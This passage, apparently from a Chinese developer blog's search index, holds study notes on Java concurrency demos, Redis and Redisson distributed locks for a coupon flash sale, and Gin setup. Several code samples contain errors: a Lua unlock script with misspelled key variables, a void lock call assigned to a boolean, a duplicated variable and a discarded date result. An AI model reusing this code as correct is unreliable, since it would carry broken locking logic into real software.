&#123; lock.unlock(); &#125; &#125; &#125; 定时任务demo能够在固定时间执行任务 package cn.itcast.n8; import java.time.DayOfWeek; import java.time.Duration; import java.time.LocalDateTime; import java.util.concurrent.Executors; import java.util.concurrent.ScheduledExecutorService; import java.util.concurrent.TimeUnit; public class ScheduleDemo &#123; // 如何实现在 固定时间点执行任务 public static void main(String[] args) &#123; // 当前时间 LocalDateTime nowTime = LocalDateTime.now(); // 周四的时间 LocalDateTime time = nowTime.withHour(22).withMinute(12).withSecond(0).withNano(0).with(DayOfWeek.SUNDAY); // 当前时间与周四的时间差值 long initDaley; // 一周的时间 long period = 1000 * 3600 * 24 * 7; if(nowTime.compareTo(time) &gt; 0 )&#123; time.plusWeeks(1); &#125; System.out.println(nowTime); System.out.println(time); initDaley = Duration.between(nowTime, time).toMillis(); ScheduledExecutorService pool = Executors.newScheduledThreadPool(1); pool.scheduleAtFixedRate(()-&gt;&#123; System.out.println(&quot;running...&quot;); &#125;, initDaley, period, TimeUnit.MILLISECONDS); &#125; &#125; CountDownLatch 应用例子模拟游戏开始之前用户的加载过程 @Slf4j(topic = &quot;c.CountDownLatchDemo&quot;) public class CountDownLatchDemo &#123; public static void main(String[] args) &#123; ExecutorService service = Executors.newFixedThreadPool(10); CountDownLatch latch = new CountDownLatch(10); Random random = new Random(); String[] allUsers = new String[10]; for (int i = 0; i &lt; 10; i++) &#123; int k = i; service.submit(() -&gt; &#123; for (int j = 0; j &lt;= 100; j++) &#123; try &#123; Thread.sleep(random.nextInt(100)); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; allUsers[k] = j + &quot;%&quot;; System.out.print(&quot;\\r&quot; + Arrays.toString(allUsers)); &#125; latch.countDown(); &#125;); &#125; try &#123; latch.await(); System.out.println(&quot;\\r&quot; + Arrays.toString(allUsers)); log.debug(&quot;游戏开始...&quot;); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; service.shutdown(); &#125; &#125;","tags":[{"name":"juc","slug":"juc","permalink":"https://sunzhengyu99.github.io/tags/juc/"}]},{"title":"redis_application","date":"2023-01-06T03:39:38.000Z","path":"2023/01/06/redis-application/","text":"优惠券秒杀实现 redis实现分布式锁 指定时间范围内 一人一单 创建购买优惠券订单的代码如下 @Transactional public Result createVoucherOrder(Long voucherId) &#123; Long userId = UserHolder.getUser().getId(); synchronized(userId.toString().intern())&#123; // 5.1.查询订单 int count = query().eq(&quot;user_id&quot;, userId).eq(&quot;voucher_id&quot;, voucherId).count(); // 5.2.判断是否存在 if (count &gt; 0) &#123; // 用户已经购买过了 return Result.fail(&quot;用户已经购买过一次！&quot;); &#125; // 6.扣减库存 boolean success = seckillVoucherService.update() .setSql(&quot;stock = stock - 1&quot;) // set stock = stock - 1 .eq(&quot;voucher_id&quot;, voucherId).gt(&quot;stock&quot;, 0) // where id = ? and stock &gt; 0 .update(); if (!success) &#123; // 扣减失败 return Result.fail(&quot;库存不足！&quot;); &#125; // 7.创建订单 VoucherOrder voucherOrder = new VoucherOrder(); // 7.1.订单id long orderId = redisIdWorker.nextId(&quot;order&quot;); voucherOrder.setId(orderId); // 7.2.用户id voucherOrder.setUserId(userId); // 7.3.代金券id voucherOrder.setVoucherId(voucherId); save(voucherOrder); // 7.返回订单id return Result.ok(orderId); &#125; &#125; 基本原理分布式锁：满足分布式系统或集群模式下多进程可见并且互斥的锁。 分布式锁的核心思想就是让大家都使用同一把锁，只要大家使用的是同一把锁，那么我们就能锁住线程，不让线程进行，让程序串行执行，这就是分布式锁的核心思路 那么分布式锁他应该满足一些什么样的条件呢？ 可见性：多个线程都能看到相同的结果，注意：这个地方说的可见性并不是并发编程中指的内存可见性，只是说多个进程之间都能感知到变化的意思 互斥：互斥是分布式锁的最基本的条件，使得程序串行执行 高可用：程序不易崩溃，时时刻刻都保证较高的可用性 高性能：由于加锁本身就让性能降低，所有对于分布式锁本身需要他就较高的加锁性能和释放锁性能 安全性：安全也是程序中必不可少的一环 Redis：redis作为分布式锁是非常常见的一种使用方式，现在企业级开发中基本都使用redis或者zookeeper作为分布式锁，利用setnx这个方法，如果插入key成功，则表示获得到了锁，如果有人插入成功，其他人插入失败则表示无法获得到锁，利用这套逻辑来实现分布式锁 Redis分布式锁的实现核心思路实现分布式锁时需要实现的两个基本方法： 获取锁： 互斥：确保只能有一个线程获取锁 非阻塞：尝试一次，成功返回true，失败返回false 释放锁： 手动释放 超时释放：获取锁时添加一个超时时间 DEL key 核心思路： 利用redis 的setNx 方法，当有多个线程进入时，我们就利用该方法，第一个线程进入时，redis 中就有这个key 了，返回了1，如果结果是1，则表示他抢到了锁，那么他去执行业务，然后再删除锁，退出锁逻辑，没有抢到锁的哥们，等待一定时间后重试即可 实现分布式锁锁的基本接口 package com.hmdp.utils; public interface ILock &#123; /** * 尝试获取锁 * @param timeOutSec * @return */ boolean tryLock(long timeOutSec); /** * 释放锁 */ void unLock(); &#125; SimpleRedisLock 利用setnx方法进行加锁，同时增加过期时间，防止死锁，此方法可以保证加锁和增加过期时间具有原子性 private static final String KEY_PREFIX=&quot;lock:&quot; @Override public boolean tryLock(long timeoutSec) &#123; // 获取线程标示 String threadId = Thread.currentThread().getId() // 获取锁 Boolean success = stringRedisTemplate.opsForValue() .setIfAbsent(KEY_PREFIX + name, threadId + &quot;&quot;, timeoutSec, TimeUnit.SECONDS); return Boolean.TRUE.equals(success); &#125; 释放锁逻辑 SimpleRedisLock 释放锁，防止删除别人的锁 public void unlock() &#123; //通过del删除锁 stringRedisTemplate.delete(KEY_PREFIX + name); &#125; 修改业务代码 @Override public Result seckillVoucher(Long voucherId) &#123; // 1.查询优惠券 SeckillVoucher voucher = seckillVoucherService.getById(voucherId); // 2.判断秒杀是否开始 if (voucher.getBeginTime().isAfter(LocalDateTime.now())) &#123; // 尚未开始 return Result.fail(&quot;秒杀尚未开始！&quot;); &#125; // 3.判断秒杀是否已经结束 if (voucher.getEndTime().isBefore(LocalDateTime.now())) &#123; // 尚未开始 return Result.fail(&quot;秒杀已经结束！&quot;); &#125; // 4.判断库存是否充足 if (voucher.getStock() &lt; 1) &#123; // 库存不足 return Result.fail(&quot;库存不足！&quot;); &#125; Long userId = UserHolder.getUser().getId(); //创建锁对象(新增代码) SimpleRedisLock lock = new SimpleRedisLock(&quot;order:&quot; + userId, stringRedisTemplate); //获取锁对象 boolean isLock = lock.tryLock(1200); //加锁失败 if (!isLock) &#123; return Result.fail(&quot;不允许重复下单&quot;); &#125; try &#123; //获取代理对象(事务) IVoucherOrderService proxy = (IVoucherOrderService) AopContext.currentProxy(); return proxy.createVoucherOrder(voucherId); &#125; finally &#123; //释放锁 lock.unlock(); &#125; &#125; Redis分布式锁误删操作情况说明逻辑说明： 持有锁的线程在锁的内部出现了阻塞，导致他的锁自动释放，这时其他线程，线程2来尝试获得锁，就拿到了这把锁，然后线程2在持有锁执行过程中，线程1反应过来，继续执行，而线程1执行过程中，走到了删除锁逻辑，此时就会把本应该属于线程2的锁进行删除，这就是误删别人锁的情况说明 解决方案：解决方案就是在每个线程释放锁的时候，去判断一下当前这把锁是否属于自己，如果属于自己，则不进行锁的删除，假设还是上边的情况，线程1卡顿，锁自动释放，线程2进入到锁的内部执行逻辑，此时线程1反应过来，然后删除锁，但是线程1，一看当前这把锁不是属于自己，于是不进行删除锁逻辑，当线程2走到删除锁逻辑时，如果没有卡过自动释放锁的时间点，则判断当前这把锁是属于自己的，于是删除这把锁。 解决Redis分布式锁误删问题需求：修改之前的分布式锁实现，满足：在获取锁时存入线程标示（可以用UUID表示）在释放锁时先获取锁中的线程标示，判断是否与当前线程标示一致 如果一致则释放锁 如果不一致则不释放锁 核心逻辑：在存入锁时，放入自己线程的标识，在删除锁时，判断当前这把锁的标识是不是自己存入的，如果是，则进行删除，如果不是，则不进行删除。 具体代码如下：加锁 private static final String ID_PREFIX = UUID.randomUUID().toString(true) + &quot;-&quot;; @Override public boolean tryLock(long timeoutSec) &#123; // 获取线程标示 String threadId = ID_PREFIX + Thread.currentThread().getId(); // 获取锁 Boolean success = stringRedisTemplate.opsForValue() .setIfAbsent(KEY_PREFIX + name, threadId, timeoutSec, TimeUnit.SECONDS); return Boolean.TRUE.equals(success); &#125; 释放锁 public void unlock() &#123; // 获取线程标示 String threadId = ID_PREFIX + Thread.currentThread().getId(); // 获取锁中的标示 String id = stringRedisTemplate.opsForValue().get(KEY_PREFIX + name); // 判断标示是否一致 if(threadId.equals(id)) &#123; // 释放锁 stringRedisTemplate.delete(KEY_PREFIX + name); &#125; &#125; 有关代码实操说明： 在我们修改完此处代码后，我们重启工程，然后启动两个线程，第一个线程持有锁后，手动释放锁，第二个线程 此时进入到锁内部，再放行第一个线程，此时第一个线程由于锁的value值并非是自己，所以不能释放锁，也就无法删除别人的锁，此时第二个线程能够正确释放锁，通过这个案例初步说明我们解决了锁误删的问题。 分布式锁的原子性问题更为极端的误删逻辑说明： 线程1现在持有锁之后，在执行业务逻辑过程中，他正准备删除锁，而且已经走到了条件判断的过程中，比如他已经拿到了当前这把锁确实是属于他自己的，正准备删除锁，但是此时他的锁到期了，那么此时线程2进来，但是线程1他会接着往后执行，当他卡顿结束后，他直接就会执行删除锁那行代码，相当于条件判断并没有起到作用，这就是删锁时的原子性问题，之所以有这个问题，是因为线程1的拿锁，比锁，删锁，实际上并不是原子性的，我们要防止刚才的情况发生， 利用Java代码调用Lua脚本改造分布式锁lua脚本本身并不需要大家花费太多时间去研究，只需要知道如何调用，大致是什么意思即可，所以在笔记中并不会详细的去解释这些lua表达式的含义。 我们的RedisTemplate中，可以利用execute方法去执行lua脚本，参数对应关系就如下图 lua脚本代码 --比较线程标识与锁中的标示是否一样 if(redis.call(&#x27;get&#x27;,KYES[1]) == ARGV[1]) then return redis.call(&#x27;del&#x27;, KEY[1]) end return 0 Java代码 private static final DefaultRedisScript&lt;Long&gt; UNLOCK_SCRIPT; static &#123; UNLOCK_SCRIPT = new DefaultRedisScript&lt;&gt;(); UNLOCK_SCRIPT.setLocation(new ClassPathResource(&quot;unlock.lua&quot;)); UNLOCK_SCRIPT.setResultType(Long.class); &#125; public void unlock() &#123; // 调用lua脚本 stringRedisTemplate.execute( UNLOCK_SCRIPT, Collections.singletonList(KEY_PREFIX + name), ID_PREFIX + Thread.currentThread().getId()); &#125; 经过以上代码改造后，我们就能够实现 拿锁比锁删锁的原子性动作了~ 总结实现思路 利用set nx ex 获取锁，并设置过期时间，保存线程标示 释放锁时先判断线程标示是否一致，一致时再删除锁，防止误删操作 特性： 利用setnx满足互斥性 利用set ex保证故障时锁依然能释放，避免死锁，提高安全性利 用Redis集群保证高可用和高并发特性 实现过程中涉及到的所有代码如下 unlaock.lua --比较线程标识与锁中的标示是否一样 if(redis.call(&#x27;get&#x27;,KYES[1]) == ARGV[1]) then return redis.call(&#x27;del&#x27;, KEY[1]) end return 0 ILock.java package com.hmdp.utils; public interface ILock &#123; /** * 尝试获取锁 * @param timeOutSec * @return */ boolean tryLock(long timeOutSec); /** * 释放锁 */ void unLock(); &#125; SimpleRedisLock.java 为ILock的实现类 package com.hmdp.utils; import cn.hutool.core.lang.UUID; import org.springframework.core.io.ClassPathResource; import org.springframework.data.redis.core.StringRedisTemplate; import org.springframework.data.redis.core.script.DefaultRedisScript; import java.time.Duration; import java.util.Collections; import java.util.concurrent.TimeUnit; public class SimpleRedisLock implements ILock&#123; private StringRedisTemplate stringRedisTemplate; public static final String KEY_PREFIX = &quot;lock:&quot;; // 使用UUID生成线程标示，防止出现重复的线程id 避免出现误删锁的操作 public static final String ID_PREFIX = UUID.randomUUID().toString(true) + &quot;-&quot;; private String name; // 因为不是spring管理的bean所以需要构造函数来初始化stringRedisTemplate和name public SimpleRedisLock(StringRedisTemplate stringRedisTemplate, String name) &#123; this.stringRedisTemplate = stringRedisTemplate; this.name = name; &#125; @Override public boolean tryLock(long timeOutSec) &#123; String threadId = ID_PREFIX + Thread.currentThread().getId(); // 获取锁操作 在redis中setnx boolean success = stringRedisTemplate.opsForValue().setIfAbsent(KEY_PREFIX + this.name, threadId, timeOutSec, TimeUnit.SECONDS); // 防止拆箱和装箱过程中出现空指针错误 return Boolean.TRUE.equals(success); &#125; public static final DefaultRedisScript&lt;Long&gt; UNLOCK_STRIPT; // 初始化lua脚本 // 使用静态代码块的执行效率更高，因为静态代码块在类加载时执行一次 static &#123; UNLOCK_STRIPT = new DefaultRedisScript&lt;&gt;(); UNLOCK_STRIPT.setLocation(new ClassPathResource(&quot;unlock.lua&quot;)); UNLOCK_STRIPT.setResultType(Long.class); &#125; @Override public void unLock() &#123; // 该函数接收三个参数：脚本(RedisScript)、keys、args stringRedisTemplate.execute( UNLOCK_STRIPT, Collections.singletonList(KEY_PREFIX + name), ID_PREFIX + Thread.currentThread().getId() ); &#125; // 此方法实现中存在缺陷 不具有原子性，可能出现bug // @Override // public void unLock() &#123; // String threadId = ID_PREFIX + Thread.currentThread().getId(); // String id = stringRedisTemplate.opsForValue().get(KEY_PREFIX + name); // if(threadId.equals(id))&#123; // stringRedisTemplate.delete(KEY_PREFIX + name); // &#125; // &#125; &#125; 创建订单的函数 @Override public Result seckillVoucher(Long voucherId) &#123; // 1.查询优惠券 SeckillVoucher voucher = seckillVoucherService.getById(voucherId); // 2.判断秒杀是否开始 if (voucher.getBeginTime().isAfter(LocalDateTime.now())) &#123; // 尚未开始 return Result.fail(&quot;秒杀尚未开始！&quot;); &#125; // 3.判断秒杀是否已经结束 if (voucher.getEndTime().isBefore(LocalDateTime.now())) &#123; // 尚未开始 return Result.fail(&quot;秒杀已经结束！&quot;); &#125; // 4.判断库存是否充足 if (voucher.getStock() &lt; 1) &#123; // 库存不足 return Result.fail(&quot;库存不足！&quot;); &#125; Long userId = UserHolder.getUser().getId(); //创建锁对象(新增代码) SimpleRedisLock lock = new SimpleRedisLock(&quot;order:&quot; + userId, stringRedisTemplate); //获取锁对象 boolean isLock = lock.tryLock(1200); //加锁失败 if (!isLock) &#123; return Result.fail(&quot;不允许重复下单&quot;); &#125; try &#123; //获取代理对象(事务) IVoucherOrderService proxy = (IVoucherOrderService) AopContext.currentProxy(); return proxy.createVoucherOrder(voucherId); &#125; finally &#123; //释放锁 lock.unlock(); &#125; &#125; Redisson实现分布式锁Redisson是一个在Redis的基础上实现的Java驻内存数据网格（In-Memory Data Grid）。它不仅提供了一系列的分布式的Java常用对象，还提供了许多分布式服务，其中就包含了各种分布式锁的实现。 Redisson入门引入依赖： &lt;dependency&gt; &lt;groupId&gt;org.redisson&lt;/groupId&gt; &lt;artifactId&gt;redisson&lt;/artifactId&gt; &lt;version&gt;3.13.6&lt;/version&gt; &lt;/dependency&gt; 配置Redisson客户端： @Configuration public class RedissonConfig &#123; @Bean public RedissonClient redissonClient()&#123; // 配置 Config config = new Config(); config.useSingleServer().setAddress(&quot;redis://192.168.150.101:6379&quot;) .setPassword(&quot;123321&quot;); // 创建RedissonClient对象 return Redisson.create(config); &#125; &#125; 如何使用Redission的分布式锁 @Resource private RedissionClient redissonClient; @Test void testRedisson() throws Exception&#123; //获取锁(可重入)，指定锁的名称 RLock lock = redissonClient.getLock(&quot;anyLock&quot;); //尝试获取锁，参数分别是：获取锁的最大等待时间(期间会重试)，锁自动释放时间，时间单位 boolean isLock = lock.tryLock(1,10,TimeUnit.SECONDS); //判断获取锁成功 if(isLock)&#123; try&#123; System.out.println(&quot;执行业务&quot;); &#125;finally&#123; //释放锁 lock.unlock(); &#125; &#125; &#125; Redisson使用在 VoucherOrderServiceImpl 注入RedissonClient @Resource private RedissonClient redissonClient; @Override public Result seckillVoucher(Long voucherId) &#123; // 1.查询优惠券 SeckillVoucher voucher = seckillVoucherService.getById(voucherId); // 2.判断秒杀是否开始 if (voucher.getBeginTime().isAfter(LocalDateTime.now())) &#123; // 尚未开始 return Result.fail(&quot;秒杀尚未开始！&quot;); &#125; // 3.判断秒杀是否已经结束 if (voucher.getEndTime().isBefore(LocalDateTime.now())) &#123; // 尚未开始 return Result.fail(&quot;秒杀已经结束！&quot;); &#125; // 4.判断库存是否充足 if (voucher.getStock() &lt; 1) &#123; // 库存不足 return Result.fail(&quot;库存不足！&quot;); &#125; Long userId = UserHolder.getUser().getId(); //创建锁对象 这个代码不用了，因为我们现在要使用分布式锁 //SimpleRedisLock lock = new SimpleRedisLock(&quot;order:&quot; + userId, stringRedisTemplate); RLock lock = redissonClient.getLock(&quot;lock:order:&quot; + userId); //获取锁对象 boolean isLock = lock.tryLock(); //加锁失败 if (!isLock) &#123; return Result.fail(&quot;不允许重复下单&quot;); &#125; try &#123; //获取代理对象(事务) IVoucherOrderService proxy = (IVoucherOrderService) AopContext.currentProxy(); return proxy.createVoucherOrder(voucherId); &#125; finally &#123; //释放锁 lock.unlock(); &#125; &#125; Redisson可重入锁实现原理 lua源码分析 总结 可重入:利用hash结构记录线程id和重入次数 可重试:利用信号量和PubSub功能实现等待、唤醒，获取锁失败的重试机制 超时续约:利用watchDog，每隔一段时间 (releaseTime/3)，重置超时时间 Redis优化秒杀异步秒杀思路优化方案：我们将耗时比较短的逻辑判断放入到redis中，比如是否库存足够，比如是否一人一单，这样的操作，只要这种逻辑可以完成，就意味着我们是一定可以下单完成的，我们只需要进行快速的逻辑判断，根本就不用等下单逻辑走完，我们直接给用户返回成功， 再在后台开一个线程，后台线程慢慢的去执行queue里边的消息，这样程序不就超级快了吗？而且也不用担心线程池消耗殆尽的问题，因为这里我们的程序中并没有手动使用任何线程池，当然这里边有两个难点 第一个难点是我们怎么在redis中去快速校验一人一单，还有库存判断 第二个难点是由于我们校验和tomct下单是两个线程，那么我们如何知道到底哪个单他最后是否成功，或者是下单完成，为了完成这件事我们在redis操作完之后，我们会将一些信息返回给前端，同时也会把这些信息丢到异步queue中去，后续操作中，可以通过这个id来查询我们tomcat中的下单逻辑是否完成了。 当用户下单之后，判断库存是否充足只需要导redis中去根据key找对应的value是否大于0即可，如果不充足，则直接结束，如果充足，继续在redis中判断用户是否可以下单，如果set集合中没有这条数据，说明他可以下单，如果set集合中没有这条记录，则将userId和优惠卷存入到redis中，并且返回0，整个过程需要保证是原子性的 当以上判断逻辑走完之后，我们可以判断当前redis中返回的结果是否是0 ，如果是0，则表示可以下单，则将之前说的信息存入到到queue中去，然后返回，然后再来个线程异步的下单，前端可以通过返回的订单id来判断是否下单成功。 Redis完成秒杀资格判断需求： 新增秒杀优惠券的同时，将优惠券信息保存到Redis中 基于Lua脚本，判断秒杀库存、一人一单，决定用户是否抢购成功 如果抢购成功，将优惠券id和用户id封装后存入阻塞队列 开启线程任务，不断从阻塞队列中获取信息，实现异步下单功能 VoucherServiceImpl @Override @Transactional public void addSeckillVoucher(Voucher voucher) &#123; // 保存优惠券 save(voucher); // 保存秒杀信息 SeckillVoucher seckillVoucher = new SeckillVoucher(); seckillVoucher.setVoucherId(voucher.getId()); seckillVoucher.setStock(voucher.getStock()); seckillVoucher.setBeginTime(voucher.getBeginTime()); seckillVoucher.setEndTime(voucher.getEndTime()); seckillVoucherService.save(seckillVoucher); // 保存秒杀库存到Redis中 //SECKILL_STOCK_KEY 这个变量定义在RedisConstans中 //private static final String SECKILL_STOCK_KEY =&quot;seckill:stock:&quot; stringRedisTemplate.opsForValue().set(SECKILL_STOCK_KEY + voucher.getId(), voucher.getStock().toString()); &#125; 完整lua表达式 createOrder.lua -- 1.参数列表 -- 1.1.优惠券id local voucherId = ARGV[1] -- 1.2.用户id local userId = ARGV[2] -- 1.3.订单id local orderId = ARGV[3] -- 2.数据key -- 2.1.库存key local stockKey = &#x27;seckill:stock:&#x27; .. voucherId -- 2.2.订单key local orderKey = &#x27;seckill:order:&#x27; .. voucherId -- 3.脚本业务 -- 3.1.判断库存是否充足 get stockKey 此时获取的是字符串类的数据，需要使用tonumber转化成数字类型与0比较 if(tonumber(redis.call(&#x27;get&#x27;, stockKey)) &lt;= 0) then -- 3.2.库存不足，返回1 return 1 end -- 3.2.判断用户是否下单 SISMEMBER orderKey userId SISMEMBER 判断userId是否存在 if(redis.call(&#x27;sismember&#x27;, orderKey, userId) == 1) then -- 3.3.存在，说明是重复下单，返回2 return 2 end -- 3.4.扣库存 incrby stockKey -1 redis.call(&#x27;incrby&#x27;, stockKey, -1) -- 3.5.下单（保存用户）sadd orderKey userId redis.call(&#x27;sadd&#x27;, orderKey, userId) -- 3.6.发送消息到队列中， XADD stream.orders * k1 v1 k2 v2 ... redis.call(&#x27;xadd&#x27;, &#x27;stream.orders&#x27;, &#x27;*&#x27;, &#x27;userId&#x27;, userId, &#x27;voucherId&#x27;, voucherId, &#x27;id&#x27;, orderId) return 0 当以上lua表达式执行完毕后，剩下的就是根据步骤3,4来执行我们接下来的任务了 VoucherOrderServiceImpl public static final DefaultRedisScript&lt;Long&gt; SECKILL_STRIPT; // 初始化lua脚本 static &#123; SECKILL_STRIPT = new DefaultRedisScript&lt;&gt;(); SECKILL_STRIPT.setLocation(new ClassPathResource(&quot;createOrder.lua&quot;)); SECKILL_STRIPT.setResultType(Long.class); &#125; @Override public Result seckillVoucher(Long voucherId) &#123; //获取用户 Long userId = UserHolder.getUser().getId(); long orderId = redisIdWorker.nextId(&quot;order&quot;); // 1.执行lua脚本 Long result = stringRedisTemplate.execute( SECKILL_SCRIPT, Collections.emptyList(), voucherId.toString(), userId.toString(), String.valueOf(orderId) ); int r = result.intValue(); // 2.判断结果是否为0 if (r != 0) &#123; // 2.1.不为0 ，代表没有购买资格 return Result.fail(r == 1 ? &quot;库存不足&quot; : &quot;不能重复下单&quot;); &#125; //TODO 保存阻塞队列 // 3.返回订单id return Result.ok(orderId); &#125; 阻塞队列的秒杀优化需求： 新增秒杀优惠券的同时，将优惠券信息保存到Redis中; 基于Lua脚本，判断秒杀库存、一人一单，决定用户是否抢购成功 如果抢购成功，将优惠券id和用户id封装后存入阻塞队列 开启线程任务，不断从阻塞队列中获取信息，实现异步下单功能 VoucherOrderServiceImpl 修改下单动作，现在我们去下单时，是通过lua表达式去原子执行判断逻辑，如果判断我出来不为0 ，则要么是库存不足，要么是重复下单，返回错误信息，如果是0，则把下单的逻辑保存到队列中去，然后异步执行 //异步处理线程池 private static final ExecutorService SECKILL_ORDER_EXECUTOR = Executors.newSingleThreadExecutor(); //在类初始化之后执行，因为当这个类初始化好了之后，随时都是有可能要执行的 @PostConstruct private void init() &#123; // 执行VoucherOrderHandler中run方法 SECKILL_ORDER_EXECUTOR.submit(new VoucherOrderHandler()); &#125; // 用于线程池处理的任务 // 当初始化完毕后，就会去从对列中去拿信息 private class VoucherOrderHandler implements Runnable&#123; @Override public void run() &#123; while (true)&#123; try &#123; // 1.获取队列中的订单信息 VoucherOrder voucherOrder = orderTasks.take(); // 2.创建订单 // 此时handleVoucherOrder函数执行时为VoucherOrderHandler的子线程，不能从ThreadLocal中取出想要的东西，所以代理的对象的获取需要放到主线程(seckillVoucher)中 handleVoucherOrder(voucherOrder); &#125; catch (Exception e) &#123; log.error(&quot;处理订单异常&quot;, e); &#125; &#125; &#125; private void handleVoucherOrder(VoucherOrder voucherOrder) &#123; // 此时handleVoucherOrder函数执行时为VoucherOrderHandler的子线程，不能从ThreadLocal中取出想要的东西 //1.获取用户 Long userId = voucherOrder.getUserId(); // 2.创建锁对象 RLock redisLock = redissonClient.getLock(&quot;lock:order:&quot; + userId); // 3.尝试获取锁 boolean isLock = redisLock.lock(); // 4.判断是否获得锁成功 if (!isLock) &#123; // 获取锁失败，直接返回失败或者重试 log.error(&quot;不允许重复下单！&quot;); return; &#125; try &#123; //注意：由于是spring的事务是放在threadLocal中，此时的是多线程，事务会失效 proxy.createVoucherOrder(voucherOrder); &#125; finally &#123; // 释放锁 redisLock.unlock(); &#125; &#125; //a private BlockingQueue&lt;VoucherOrder&gt; orderTasks =new ArrayBlockingQueue&lt;&gt;(1024 * 1024); @Override public Result seckillVoucher(Long voucherId) &#123; Long userId = UserHolder.getUser().getId(); long orderId = redisIdWorker.nextId(&quot;order&quot;); // 1.执行lua脚本 Long result = stringRedisTemplate.execute( SECKILL_SCRIPT, Collections.emptyList(), voucherId.toString(), userId.toString(), String.valueOf(orderId) ); int r = result.intValue(); // 2.判断结果是否为0 if (r != 0) &#123; // 2.1.不为0 ，代表没有购买资格 return Result.fail(r == 1 ? &quot;库存不足&quot; : &quot;不能重复下单&quot;); &#125; VoucherOrder voucherOrder = new VoucherOrder(); // 2.3.订单id long orderId = redisIdWorker.nextId(&quot;order&quot;); voucherOrder.setId(orderId); // 2.4.用户id voucherOrder.setUserId(userId); // 2.5.代金券id voucherOrder.setVoucherId(voucherId); // 2.6.放入阻塞队列 orderTasks.add(voucherOrder); //3.获取代理对象 proxy = (IVoucherOrderService)AopContext.currentProxy(); //4.返回订单id return Result.ok(orderId); &#125; @Transactional public void createVoucherOrder(VoucherOrder voucherOrder) &#123; Long userId = voucherOrder.getUserId(); // 5.1.查询订单 int count = query().eq(&quot;user_id&quot;, userId).eq(&quot;voucher_id&quot;, voucherOrder.getVoucherId()).count(); // 5.2.判断是否存在 if (count &gt; 0) &#123; // 用户已经购买过了 log.error(&quot;用户已经购买过了&quot;); return ; &#125; // 6.扣减库存 boolean success = seckillVoucherService.update() .setSql(&quot;stock = stock - 1&quot;) // set stock = stock - 1 .eq(&quot;voucher_id&quot;, voucherOrder.getVoucherId()).gt(&quot;stock&quot;, 0) // where id = ? and stock &gt; 0 .update(); if (!success) &#123; // 扣减失败 log.error(&quot;库存不足&quot;); return ; &#125; save(voucherOrder); &#125; Redis消息队列实现异步秒杀Redis消息队列-基于Stream的消息队列-消费者组 基于Redis的Stream结构作为消息队列，实现异步秒杀下单需求： 创建一个Stream类型的消息队列，名为stream.orders 修改之前的秒杀下单Lua脚本，在认定有抢购资格后，直接向stream.orders中添加消息，内容包含voucherId、userId、orderId 项目启动时，开启一个线程任务，尝试获取stream.orders中的消息，完成下单\\ 修改lua表达式,新增3.6 ---- 3.6.发送消息到队列中， XADD stream.orders * k1 v1 k2 v2 ... redis.call(&#x27;xadd&#x27;, &#x27;stream.orders&#x27;, &#x27;*&#x27;, &#x27;userId&#x27;, userId, &#x27;voucherId&#x27;, voucherId, &#x27;id&#x27;, orderId) VoucherOrderServiceImpl private class VoucherOrderHandler implements Runnable &#123; @Override public void run() &#123; while (true) &#123; try &#123; // 1.获取消息队列中的订单信息 XREADGROUP GROUP g1 c1 COUNT 1 BLOCK 2000 STREAMS s1 &gt; List&lt;MapRecord&lt;String, Object, Object&gt;&gt; list = stringRedisTemplate.opsForStream().read( Consumer.from(&quot;g1&quot;, &quot;c1&quot;), StreamReadOptions.empty().count(1).block(Duration.ofSeconds(2)), StreamOffset.create(&quot;stream.orders&quot;, ReadOffset.lastConsumed()) ); // 2.判断订单信息是否为空 if (list == null || list.isEmpty()) &#123; // 如果为null，说明没有消息，继续下一次循环 continue; &#125; // 解析数据 MapRecord&lt;String, Object, Object&gt; record = list.get(0); Map&lt;Object, Object&gt; value = record.getValue(); VoucherOrder voucherOrder = BeanUtil.fillBeanWithMap(value, new VoucherOrder(), true); // 3.创建订单 createVoucherOrder(voucherOrder); // 4.确认消息 XACK stringRedisTemplate.opsForStream().acknowledge(&quot;s1&quot;, &quot;g1&quot;, record.getId()); &#125; catch (Exception e) &#123; log.error(&quot;处理订单异常&quot;, e); //处理异常消息 handlePendingList(); &#125; &#125; &#125; private void handlePendingList() &#123; while (true) &#123; try &#123; // 1.获取pending-list中的订单信息 XREADGROUP GROUP g1 c1 COUNT 1 BLOCK 2000 STREAMS s1 0 List&lt;MapRecord&lt;String, Object, Object&gt;&gt; list = stringRedisTemplate.opsForStream().read( Consumer.from(&quot;g1&quot;, &quot;c1&quot;), StreamReadOptions.empty().count(1), StreamOffset.create(&quot;stream.orders&quot;, ReadOffset.from(&quot;0&quot;)) ); // 2.判断订单信息是否为空 if (list == null || list.isEmpty()) &#123; // 如果为null，说明没有异常消息，结束循环 break; &#125; // 解析数据 MapRecord&lt;String, Object, Object&gt; record = list.get(0); Map&lt;Object, Object&gt; value = record.getValue(); VoucherOrder voucherOrder = BeanUtil.fillBeanWithMap(value, new VoucherOrder(), true); // 3.创建订单 createVoucherOrder(voucherOrder); // 4.确认消息 XACK stringRedisTemplate.opsForStream().acknowledge(&quot;s1&quot;, &quot;g1&quot;, record.getId()); &#125; catch (Exception e) &#123; log.error(&quot;处理pendding订单异常&quot;, e); try&#123; Thread.sleep(20); &#125;catch(Exception e)&#123; e.printStackTrace(); &#125; &#125; &#125; &#125; &#125;","tags":[{"name":"redis","slug":"redis","permalink":"https://sunzhengyu99.github.io/tags/redis/"}]},{"title":"gin","date":"2022-12-08T07:56:15.000Z","path":"2022/12/08/gin/","text":"Gin 是一个 Go(Golang) 编写的轻量级 http web 架，运行速度非常快。感觉学完javaweb后在学goweb上手就很快，很多东西原理上是一样的，只是实现方式有所改变 安装gin安装失败时配置go环境 go env -w GO111MODULE=on go env -w GOPROXY=https://goproxy.io,direct 安装gin go get -u -v github.com/gin-gonic/gin 创建gin项目goland创建时，直接选择go modules即可，否则后面导包可能会出错 启动ginpackage main import ( &quot;github.com/gin-gonic/gin&quot; &quot;net/http&quot; ) func main() &#123; // 创建一个默认路由 r := gin.Default() // 新建一个路由 r.GET(&quot;/&quot;, func(c *gin.Context) &#123; c.String(http.StatusOK, &quot;搭建完成&quot;) &#125;) r.GET(&quot;/hello&quot;, func(c *gin.Context) &#123; c.String(http.StatusOK, &quot;hello,gin&quot;) &#125;) // 启动web服务 默认在8080端口运行 r.Run(&quot;:8888&quot;) // 端口号8888 &#125; 安装freshgin项目热加载安装fresh go get github.com/pilu/fresh 在项目目录下运行fresh即可 gin返回json数据使用map r.GET(&quot;/success&quot;, func(c *gin.Context) &#123; c.JSON(http.StatusOK,map[string] 